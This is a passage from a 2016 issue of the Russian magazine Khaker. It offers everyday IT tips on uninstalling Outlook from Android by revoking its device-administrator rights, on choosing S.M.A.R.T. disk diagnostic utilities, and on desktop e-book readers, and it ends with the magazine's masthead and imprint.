гому подобную проблему никак не решить. После пересохранения файла
при помощи того же Microsoft Office наследуемый ACL будет возвращаться
вновь и вновь.

УДАЛЯЕМ OUTLOOK С ANDROID
Если установить Outlook не так сложно, то вот с удалением часто возникают
проблемы. Любимая корпорация подбросила серьезную закавыку, и из-за нее
многие так и продолжают держать у себя на устройстве почтовый клиент, кото-
рый занимает место и висит мертвым грузом. При попытке удалить его Android
прикидывается шлангом и не дает никаких разъяснений. Оказывается, доста-
точно проделать довольно простые действия, чтобы избавиться от ненужного
приложения.
   Outlook относится к тем приложениям, которые при установке получают пра-
ва администратора устройства, тем самым расширяя свои полномочия. К при-
меру, Outlook способен требовать установки пароля на смартфоне, блокиро-
вать его, отслеживать геоположение, шифровать устройство и делать многое
другое. Как ты, наверное, уже догадался, для удаления нужно сначала лишить
его админских прав. Для этого заходим в настройки девайса и идем на вкладку
«Безопасность».





              Вкладка «Безопасность»              «Администраторы устройства»


На ней нас интересует пункт «Хранилище учетных данных».
Следуем в «Администраторы устройства».
  Видим наш Outlook, который, засев здесь, блокирует свое удаление с наше-
го устройства. Тыкаем на него и отключаем.





     Список администраторов устройства                    Отключаем виновника


После этих нехитрых действий приложение без каких-либо проблем удалится
с устройства. Как видишь, все довольно просто, когда знаешь, где искать и куда
нажать.

ВЫБИРАЕМ УТИЛИТУ ДЛЯ ПРОВЕРКИ S.M.A.R.T. ЖЕСТКИХ ДИСКОВ
НА ДЕСКТОПЕ
Поговорим про различные программы диагностики состояния жестких дисков.
Как ты, наверное, знаешь, таких тулз масса — начиная от консольных утилит
и заканчивая Live CD. Какую лучше выбрать? Давай разбираться.
  Одна из самых распространенных — это smartctl. Есть версии для Windows,
OS X и даже Live CD. Это удобная штука, помогает легко настроить автоматиче-
скую проверку через cron и всегда быть в курсе состояния своих винтов.





                                                                     smartctl в действии

Если хочется что-то с графическим интерфейсом, то тут выбор просто огром-
ный: от специализированных программ по проверке S.M.A.R.T. до монстров
вроде AIDA64, которые способны отслеживать еще кучу параметров системы
и проводить сотни тестов стабильности. Одна из программ, которые показы-
вают исключительно информацию о диске, — это HDDScan. Программа имеет
простой и понятный интерфейс, но при этом у нее неплохие возможности:
•  тесты накопителей: в режиме линейной верификации, в режиме линейного
   чтения или линейной записи, а также в режиме чтения Butterfly (искусствен-
  ный тест случайного чтения);
•  чтение и анализ параметров S.M.A.R.T. дисков с интерфейсами ATA, SATA,
  USB и FireWire;
•  чтение и анализ таблиц логов с дисков с интерфейсом SCSI;
•  запуск тестов S.M.A.R.T. на накопителях с интерфейсами ATA, SATA, USB
   и FireWire;
•  мониторинг температуры на накопителях с интерфейсами ATA, SATA, USB,
   FireWire и SCSI;
•  чтение и анализ идентификационной информации с накопителей с интер-
  фейсами ATA, SATA, USB, FireWire и SCSI;
•  изменение параметров AAM, APM, PM на накопителях с интерфейсами ATA,
   SATA, USB и FireWire;
•  просмотр информации о дефектах на накопителях с интерфейсом SCSI;
•  запуск и остановка шпинделя на накопителях с интерфейсами ATA, SATA,
   USB, FireWire и SCSI;
•  сохранение отчетов в формате MHT;
•  печать отчетов;
•  поддержка командной строки;
•  поддержка накопителей SSD.





                                                           Главное окно HDDScan

Также хочется выделить еще одну интересную программу — она называется
CrystalDiskInfo и наглядно показывает информацию о дисках: их характеристи-
ки, текущие параметры и данные S.M.A.R.T. С ее помощью можно наблюдать
температуру HDD и SSD в трее, к тому же она ведет график изменений за по-
следний месяц, умеет запускаться с задержкой, может управлять настройками
Advanced Power Management и Automatic Acoustic Management (максимальная
скорость либо тишина и экономия энергии). Это одна из немногих программ,
которые поддерживают внешние жесткие диски и RAID-массивы Intel.





                                                                             CrystalDiskInfo


Из загрузочных дисков мне больше всего нравится Victoria. Среди ее плюсов:
•  программа бесплатна;
•  не требует установки — для работы версии под Windows требуется только
   наличие в системной папке /system32/drivers/ файла porttalk.sys;
•  за счет прямого доступа к оборудованию скорость работы программы вы-
   сока;
•  исполняемый файл имеет малый размер;
•  поддерживает множество различных тестов;
•  есть поддержка интерфейса AHCI (в отличие, например, от программы
  MHDD; перед работой с MHDD требуется в меню BIOS переключаться на ре-
  жим загрузки IDE).
  Но есть и недостатки:
•  при выполнении теста Random Seek часто бывают ошибки;
•  при одновременном запуске нескольких экземпляров программы для про-
   верки скорости чтения/записи нескольких дисков скорость работы замет-
   но снижается. Но только при визуальной отрисовке таблиц блоков — чтобы
   устранить этот недостаток, можно перейти на другую вкладку программы
   после запуска проверки;
•  исходный код программы закрыт;
•  нет поддержки других операционных систем.

И еще один возможный минус — разработка Victoria прекращена, а последняя
версия датируется 2008 годом.





                                                                                          Victoria

Если по какой-то причине Victoria не понравится, можно использовать MHDD.
Это программа для низкоуровневой диагностики жестких дисков. Она поддер-
живает работу со всеми распространенными интерфейсами: IDE, Serial ATA,
SCSI. А при помощи специального драйвера (эмулятор USB через SCSI) мож-
но получить доступ к устройствам, подключенным по USB. Утилита позволяет
производить очень точную диагностику механической части накопителя, про-
сматривать S.M.A.R.T.-атрибуты, форматировать диски на низком уровне (Low
Level Format) и «чинить» дефектные секторы.





                                               MHDD за работой

Также советую посмотреть на сравнительную таблицу Victoria и MHDD, мате-
риал весьма познавательный. В целом однозначной рекомендации нет, и си-
туации бывают разные. Иногда достаточно глянуть на череду ошибок в логах
системы, чтобы понять, что диск сыпется на глазах, а иногда приходится долго
и упорно шаманить с низкоуровневой диагностикой, чтобы разобраться, что же
не так. Так что лучше иметь несколько утилит на все случаи жизни.

ВЫБИРАЕМ ПРОГРАММУ ДЛЯ ЧТЕНИЯ КНИГ С ЭКРАНА КОМПЬЮТЕРА
Если ты любишь почитать, но что-то мешает тебе развалиться на диване с бу-
мажной книжкой или планшетом (к примеру, то, что ты сидишь на работе и не хо-
чешь палиться перед начальством), тебе пригодится программа для чтения книг
с экрана. Посмотрим, какой есть выбор. Книжных форматов много, но я пред-
лагаю сосредоточиться на FB2 как на наиболее распространенном.
  Одна из моих любимых программ — это Cool Reader. Это кросс-платфор-
менная читалка с огромным набором функций. Она поддерживает форматы
FB2 (включая таблицы, стили, подписи к картинкам), EPUB (без DRM), MOBI
(без DRM), PDB (PalmDOC, eReader), DOC, RTF, HTML, CHM, TXT и TCR. Умеет
работать с содержанием книг (FB2, EPUB, RTF), CSS в FB2, EPUB и HTML, кар-
тинками JPG, PNG и GI. Можно выбрать способ чтения — листание страниц или
прокрутку. Программа умеет показывать по две страницы разом, поддержива-
ет поиск по тексту, выделение, перекрестные ссылки и сноски. Поворачивает
страницы на 90, 180 или 270 градусов, автоматически расставляет переносы
(в том числе по словарю), автоматически переформатирует TXT, распознает
кодировки и форматы текста, имеет полноэкранный режим и так далее, и так
далее. Есть даже звуковой движок для чтения вслух, а в версии для мобильных
устройств плюшек еще больше.





                                                                             Cool reader

Еще одна достойная программа — это ICE Book Reader Professional. ICE — мощ-
ная читалка электронных книжек, которую можно использовать для перевода
текста в аудио- и видеофайлы. А еще это альтернативная читалка для форма-
тов LIT, CHM и EPUB, которая не использует компоненты Microsoft Reader или
Microsoft Help. Она может пригодиться и как конвертер различных форматов:
TXT в HTML и HTML в TXT, TXT в DOC и DOC в TXT, PDB, LIT и FB2 в TXT и так да-
лее, причем поддерживается и конвертация кодировок. Кстати, можно не толь-
ко конвертировать и читать книжки, но и удобно организовывать библиотеку.
И конечно, есть различные настройки скроллинга и размера текста, что тоже
немаловажно.





                                                           ICE Book Reader Professional

И наконец, Haali Reader. Это первая читалка, которая начала поддерживать
формат FictionBook, что помогло ему набрать популярность. Помимо этого, она
позволяет читать документы в форматах TXT, XML и прочих.





                                                                                Haali Reader

Ну и конечно, кроме этих программ есть куча других. Здесь и Calibre, весьма
мощный менеджер электронных книг, и ToM Reader Russian со своей реали-
зацией озвучки текстов, и много других программ. По большому счету все они
похожи, разница только в деталях реализации.
                                    18+





  № 6 (209)

                      Илья Русанен              Алексей Глазков
                        Главный редактор           Выпускающий редактор
                             rusanen@glc.ru                    glazkov@glc.ru

                   Андрей Письменный          Евгения Шарипова
                         Шеф-редактор              Литературный редактор
                            pismenny@glc.ru


                       РЕДАКТОРЫ РУБРИК

      Андрей Письменный        Антон «ant» Жуков            Александр «Dr.»
      PC ZONE, СЦЕНА, UNITS           ВЗЛОМ                   Лозовский
           pismenny@glc.ru                 zhukov@glc.ru              MALWARE, КОДИНГ,
                                                                PHREAKING
                                                                                lozovsky@glc.ru       Юрий Гольцев            Евгений Зобнин
           ВЗЛОМ                    X-MOBILE
             goltsev@glc.ru                   zobnin@glc.ru

         Илья Русанен            Павел Круглов
            КОДИНГ                UNIXOID и SYN/ACK
            rusanen@glc.ru                  kruglov@glc.ru


                         MEGANEWS

                              Мария Нефёдова
                                       nefedova.maria@gameland.ru



                                 АРТ

                                  Анна Королькова              Алик Вайнер
                                         Верстальщик                    Обложка
                                      цифровой версии


                            РЕКЛАМА

                              Мария Самсоненко
                                   Менеджер по рекламе
                                          samsonenko@glc.ru


                  РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                         Подробная информация по подписке: paywall@glc.ru
                                    Отдел распространения
                                   Наталья Алехина (lapina@glc.ru)
                              Адрес для писем: Москва, 109147, а/я 50




В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленинская Слобода, д. 19, Омега плаза. Изда-
тель: ООО «Эрсиа»: 606400,  Нижегородская обл., Балахнинский р-н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Принтер Эдишионс», 614111,
Пермский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информационных технологий и мас-
совых коммуникаций (Роскомнадзоре), свидетельство ПИ № ФС77-56756 от 29.01.2014 года. Мнение редакции не обязательно совпадает с мнени-
ем авторов. Все материалы в номере предоставляются как информация к размышлению. Лица, использующие данную информацию в противозаконных
целях, могут быть привлечены к ответственности. Редакция не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицен-
зирования и получения прав на использование редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2016